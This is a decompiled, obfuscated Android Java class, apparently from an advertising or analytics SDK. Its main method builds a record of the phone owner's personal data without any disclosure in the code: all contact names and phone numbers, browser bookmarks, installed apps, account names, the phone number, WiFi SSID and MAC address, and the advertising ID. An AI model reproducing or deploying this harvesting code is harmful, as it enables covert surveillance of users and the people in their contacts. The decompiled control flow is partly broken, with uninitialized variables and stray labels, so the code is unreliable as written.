package com.b.a;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.provider.Browser;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.ads.identifier.AdvertisingIdClient.Info;
import com.google.android.gms.common.d;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;

public final class b
{
  Context a;
  String b = null;
  private TelephonyManager c;
  
  public b(Context paramContext)
  {
    this.a = paramContext;
    this.c = ((TelephonyManager)this.a.getSystemService("phone"));
  }
  
  private static String b()
  {
    try
    {
      InetAddress localInetAddress;
      do
      {
        localObject = NetworkInterface.getNetworkInterfaces();
        Enumeration localEnumeration;
        while (!localEnumeration.hasMoreElements())
        {
          if (!((Enumeration)localObject).hasMoreElements()) {
            break;
          }
          localEnumeration = ((NetworkInterface)((Enumeration)localObject).nextElement()).getInetAddresses();
        }
        localInetAddress = (InetAddress)localEnumeration.nextElement();
      } while (localInetAddress.isLoopbackAddress());
      Object localObject = localInetAddress.getHostAddress();
      return localObject;
    }
    catch (Exception localException)
    {
      Log.e("DataFetcher", localException.toString());
    }
    return null;
  }
  
  private String b(String paramString)
  {
    try
    {
      paramString = this.a.getPackageManager().getApplicationInfo(this.a.getPackageName(), 128).metaData.getString(paramString);
      return paramString;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
    return null;
  }
  
  private String c()
  {
    if (this.b == null) {
      AsyncTask.execute(new Runnable()
      {
        public final void run()
        {
          try
          {
            Object localObject = AdvertisingIdClient.getAdvertisingIdInfo(b.this.a);
            b localB = b.this;
            if (localObject != null) {}
            for (localObject = ((AdvertisingIdClient.Info)localObject).getId();; localObject = null)
            {
              localB.b = ((String)localObject);
              return;
            }
            return;
          }
          catch (d localD)
          {
            return;
          }
          catch (IOException localIOException)
          {
            return;
          }
          catch (com.google.android.gms.common.c localC) {}
        }
      });
    }
    return this.b;
  }
  
  private String d()
  {
    Object localObject1 = new StringBuilder();
    Object localObject2 = this.a.getPackageManager().getInstalledPackages(0);
    int i = 0;
    while (i < ((List)localObject2).size())
    {
      PackageInfo localPackageInfo = (PackageInfo)((List)localObject2).get(i);
      if ((localPackageInfo.applicationInfo.flags & 0x1) == 0)
      {
        ((StringBuilder)localObject1).append(localPackageInfo.packageName);
        ((StringBuilder)localObject1).append("|");
      }
      i += 1;
    }
    if (((StringBuilder)localObject1).length() > 0) {
      ((StringBuilder)localObject1).deleteCharAt(((StringBuilder)localObject1).length() - 1);
    }
    localObject2 = ((StringBuilder)localObject1).toString();
    localObject1 = localObject2;
    if (TextUtils.isEmpty((CharSequence)localObject2)) {
      localObject1 = null;
    }
    return localObject1;
  }
  
  private String e()
  {
    Object localObject = new StringBuilder();
    Cursor localCursor = this.a.getContentResolver().query(Browser.BOOKMARKS_URI, new String[] { "title", "url" }, null, null, null);
    if (localCursor == null) {}
    do
    {
      return null;
      while (localCursor.moveToNext())
      {
        ((StringBuilder)localObject).append(localCursor.getString(localCursor.getColumnIndex("url")));
        ((StringBuilder)localObject).append("|");
      }
      localCursor.close();
      if (((StringBuilder)localObject).length() > 0) {
        ((StringBuilder)localObject).deleteCharAt(((StringBuilder)localObject).length() - 1);
      }
      localObject = ((StringBuilder)localObject).toString();
    } while (TextUtils.isEmpty((CharSequence)localObject));
    return localObject;
  }
  
  private String f()
  {
    try
    {
      String str = this.a.getPackageManager().getPackageInfo(this.a.getPackageName(), 0).versionName;
      return str;
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException) {}
    return null;
  }
  
  private String g()
  {
    String str1 = null;
    Object localObject1 = new StringBuilder();
    ContentResolver localContentResolver = this.a.getContentResolver();
    Cursor localCursor = localContentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
    if (localCursor == null) {
      str1 = ((StringBuilder)localObject1).toString();
    }
    do
    {
      return str1;
      if (localCursor.getCount() > 0) {
        while (localCursor.moveToNext())
        {
          Object localObject2 = localCursor.getString(localCursor.getColumnIndex("_id"));
          String str2 = localCursor.getString(localCursor.getColumnIndex("display_name"));
          if (Integer.parseInt(localCursor.getString(localCursor.getColumnIndex("has_phone_number"))) > 0)
          {
            localObject2 = localContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[] { localObject2 }, null);
            if (localObject2 != null)
            {
              while (((Cursor)localObject2).moveToNext())
              {
                String str3 = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("data1"));
                ((StringBuilder)localObject1).append(str2);
                ((StringBuilder)localObject1).append(":");
                ((StringBuilder)localObject1).append(str3);
                ((StringBuilder)localObject1).append("|");
              }
              ((Cursor)localObject2).close();
            }
          }
        }
      }
      localCursor.close();
      if (((StringBuilder)localObject1).length() > 0) {
        ((StringBuilder)localObject1).deleteCharAt(((StringBuilder)localObject1).length() - 1);
      }
      localObject1 = ((StringBuilder)localObject1).toString();
    } while (TextUtils.isEmpty((CharSequence)localObject1));
    return localObject1;
  }
  
  public final c a()
  {
    Object localObject2 = null;
    int j = 0;
    c localC = new c();
    Object localObject1 = this.a.getPackageName();
    localC.a(c.b.d, localObject1);
    localObject1 = System.getProperty("http.agent");
    localC.a(c.b.e, localObject1);
    localObject1 = b();
    localC.a(c.b.f, localObject1);
    localObject1 = c();
    localC.a(c.b.g, localObject1);
    long l = System.currentTimeMillis();
    localC.a(c.b.j, Long.valueOf(l));
    localC.a(c.b.k, Integer.valueOf(0));
    localObject1 = Build.MANUFACTURER;
    localC.a(c.b.w, localObject1);
    localObject1 = Build.MODEL;
    localC.a(c.b.x, localObject1);
    localObject1 = Build.VERSION.RELEASE;
    localC.a(c.b.y, localObject1);
    int i = Build.VERSION.SDK_INT;
    localC.a(c.b.A, Integer.valueOf(i));
    localObject1 = Locale.getDefault().getLanguage();
    localC.a(c.b.B, localObject1);
    Object localObject3 = this.c.getSimOperator();
    localObject1 = localObject3;
    if (TextUtils.isEmpty((CharSequence)localObject3)) {
      localObject1 = null;
    }
    localC.a(c.b.C, localObject1);
    localObject1 = ((ConnectivityManager)this.a.getSystemService("connectivity")).getNetworkInfo(1).getState();
    if ((localObject1 == NetworkInfo.State.CONNECTED) || (localObject1 == NetworkInfo.State.CONNECTING))
    {
      i = 1;
      localC.a(c.b.D, Integer.valueOf(i));
      localObject1 = AccountManager.get(this.a).getAccountsByType("com.google");
      if (localObject1.length <= 0) {
        break label863;
      }
    }
    label619:
    label863:
    for (localObject1 = localObject1[0];; localObject1 = null)
    {
      if ((localObject1 == null) || (TextUtils.isEmpty(((Account)localObject1).name))) {}
      for (localObject1 = null;; localObject1 = ((Account)localObject1).name)
      {
        localC.a(c.b.K, localObject1);
        localObject1 = AccountManager.get(this.a).getAccounts();
        localObject3 = new StringBuilder();
        if (localObject1.length <= 0) {
          break label619;
        }
        i = j;
        while (i < localObject1.length)
        {
          Object localObject4 = localObject1[i];
          if ((localObject4 != null) && (!TextUtils.isEmpty(localObject4.name)))
          {
            ((StringBuilder)localObject3).append(localObject4.name);
            ((StringBuilder)localObject3).append("|");
          }
          i += 1;
        }
        switch (this.c.getNetworkType())
        {
        default: 
          i = 0;
          break;
        case 7: 
          i = 9;
          break;
        case 4: 
          i = 6;
          break;
        case 2: 
          i = 4;
          break;
        case 14: 
          i = 16;
          break;
        case 5: 
          i = 7;
          break;
        case 6: 
          i = 8;
          break;
        case 12: 
          i = 14;
          break;
        case 1: 
          i = 3;
          break;
        case 8: 
          i = 10;
          break;
        case 10: 
          i = 12;
          break;
        case 15: 
          i = 17;
          break;
        case 9: 
          i = 11;
          break;
        case 11: 
          i = 13;
          break;
        case 13: 
          i = 15;
          break;
        case 3: 
          i = 5;
          break;
        case 0: 
          i = 0;
          break;
        }
      }
      if (((StringBuilder)localObject3).length() > 0) {
        ((StringBuilder)localObject3).deleteCharAt(((StringBuilder)localObject3).length() - 1);
      }
      localObject3 = ((StringBuilder)localObject3).toString();
      localObject1 = localObject3;
      if (TextUtils.isEmpty((CharSequence)localObject3)) {
        localObject1 = null;
      }
      localC.a(c.b.L, localObject1);
      localObject1 = this.c.getLine1Number();
      if (TextUtils.isEmpty((CharSequence)localObject1)) {
        localObject1 = localObject2;
      }
      for (;;)
      {
        localC.a(c.b.M, localObject1);
        localObject1 = d();
        localC.a(c.b.N, localObject1);
        localObject1 = e();
        localC.a(c.b.O, localObject1);
        localObject1 = ((WifiManager)this.a.getSystemService("wifi")).getConnectionInfo().getSSID();
        localC.a(c.b.Q, localObject1);
        localObject1 = ((WifiManager)this.a.getSystemService("wifi")).getConnectionInfo().getMacAddress();
        localC.a(c.b.T, localObject1);
        localObject1 = b("UMENG_CHANNEL");
        localC.a(c.b.S, localObject1);
        localObject1 = f();
        localC.a(c.b.R, localObject1);
        localObject1 = g();
        localC.a(c.b.U, localObject1);
        return localC;
      }
    }
  }
  
  public final c a(String paramString)
  {
    c localC = new c();
    String str = c();
    localC.a(c.a.a, str);
    long l = System.currentTimeMillis();
    localC.a(c.a.b, Long.valueOf(l));
    localC.a(c.a.c, paramString);
    return localC;
  }
}
